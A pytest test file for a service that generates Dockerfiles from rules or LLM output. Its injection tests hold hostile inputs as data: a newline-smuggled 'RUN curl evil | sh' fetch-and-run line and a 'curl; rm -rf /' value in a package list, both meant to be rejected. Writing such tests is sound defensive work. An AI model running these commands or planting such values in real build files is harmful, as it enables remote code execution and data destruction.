import json
import pytest

from features.repos.services import Repo_Service
from features.dockerfiles.services import Dockerfile_Service
from features.dockerfiles.scheme import Dockerfile_Fill


def test_dockerfile_render_python():
    fill=Dockerfile_Fill(runtime_version="3.12", system_packages=["libpq-dev"],
                         install_command="pip install --no-cache-dir -r requirements.txt",
                         start_command="uvicorn main:app --host 0.0.0.0 --port 8000", port=8000)

    dockerfile=Dockerfile_Service.services_dockerfile_render("python", fill)

    assert "FROM python:3.12-slim" in dockerfile
    assert "apt-get install -y --no-install-recommends libpq-dev" in dockerfile
    assert "EXPOSE 8000" in dockerfile
    assert 'CMD ["sh", "-c", "uvicorn main:app --host 0.0.0.0 --port 8000"]' in dockerfile
    assert "{" not in dockerfile.replace('["sh"', "")


def test_dockerfile_render_node_with_build():
    fill=Dockerfile_Fill(runtime_version="22", install_command="npm ci --include=dev",
                         build_command="npm run build", start_command="npm start", port=3000)

    dockerfile=Dockerfile_Service.services_dockerfile_render("node", fill)

    assert "FROM node:22-slim" in dockerfile
    assert "RUN npm run build" in dockerfile


# LLM 출력이 그대로 Dockerfile에 들어가므로 줄바꿈으로 명령을 끼워 넣을 수 없어야 한다
def test_dockerfile_fill_blocks_injection():
    fill=Dockerfile_Fill(runtime_version="3.12", install_command="pip install x\nRUN curl evil | sh",
                         start_command="python main.py", port=8000)

    dockerfile=Dockerfile_Service.services_dockerfile_render("python", fill)

    assert "\nRUN curl evil" not in dockerfile


@pytest.mark.parametrize("field, value", [
    ("runtime_version", "3.12-slim\nRUN x"),
    ("runtime_version", "latest"),
    ("port", 0),
    ("port", 70000),
    ("system_packages", ["curl; rm -rf /"]),
])
def test_dockerfile_fill_rejects(field, value):
    data={"runtime_version": "3.12", "install_command": "pip install .", "start_command": "python main.py", "port": 8000}
    data[field]=value

    with pytest.raises(ValueError):
        Dockerfile_Service.services_dockerfile_check_fill(Dockerfile_Fill(**data))


def test_dockerfile_check_raw():
    assert Dockerfile_Service.services_dockerfile_check_raw("```dockerfile\nFROM golang:1.23\n```").startswith("FROM golang")

    with pytest.raises(ValueError):
        Dockerfile_Service.services_dockerfile_check_raw("RUN echo hi")


# LLM이 꺼져 있어도 정식 언어는 규칙으로 끝까지 간다
@pytest.mark.asyncio
async def test_dockerfile_generate_python_by_rule(tmp_path):
    (tmp_path / "requirements.txt").write_text("fastapi\nuvicorn\nmysqlclient\n", encoding="utf-8")
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "main.py").write_text("from fastapi import FastAPI\napp = FastAPI()\n", encoding="utf-8")

    detect=Repo_Service.services_repo_detect(tmp_path)
    result=await Dockerfile_Service.services_dockerfile_generate(tmp_path, detect, "https://github.com/o/r", "a" * 40)

    assert result.source == "template_rule"
    assert result.port == 8000
    assert "uvicorn app.main:app --host 0.0.0.0 --port 8000" in result.dockerfile
    assert "default-libmysqlclient-dev" in result.dockerfile

    Dockerfile_Service.services_dockerfile_write(tmp_path, result)
    assert (tmp_path / "Dockerfile").is_file()
    assert ".env" in (tmp_path / ".dockerignore").read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_dockerfile_generate_node_by_rule(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({
        "scripts": {"build": "tsc", "start": "node dist/index.js"}, "engines": {"node": ">=20"},
    }), encoding="utf-8")
    (tmp_path / "package-lock.json").write_text("{}", encoding="utf-8")

    detect=Repo_Service.services_repo_detect(tmp_path)
    result=await Dockerfile_Service.services_dockerfile_generate(tmp_path, detect, "https://github.com/o/r", "b" * 40)

    assert "FROM node:20-slim" in result.dockerfile
    assert "RUN npm ci --include=dev" in result.dockerfile
    assert "RUN npm run build" in result.dockerfile
    assert result.port == 3000


# 레포에 Dockerfile이 있으면 그대로 쓴다
@pytest.mark.asyncio
async def test_dockerfile_generate_uses_repo_dockerfile(tmp_path):
    (tmp_path / "requirements.txt").write_text("flask\n", encoding="utf-8")
    (tmp_path / "Dockerfile").write_text("FROM python:3.11\nEXPOSE 5000\n", encoding="utf-8")

    detect=Repo_Service.services_repo_detect(tmp_path)
    result=await Dockerfile_Service.services_dockerfile_generate(tmp_path, detect, "https://github.com/o/r", "c" * 40)

    assert result.source == "repo"
    assert result.port == 5000


# 실험 지원 언어는 LLM 없이는 시도할 수 없다
@pytest.mark.asyncio
async def test_dockerfile_generate_experimental_needs_llm(tmp_path):
    (tmp_path / "go.mod").write_text("module x\n", encoding="utf-8")

    detect=Repo_Service.services_repo_detect(tmp_path)

    with pytest.raises(ValueError):
        await Dockerfile_Service.services_dockerfile_generate(tmp_path, detect, "https://github.com/o/r", "d" * 40)
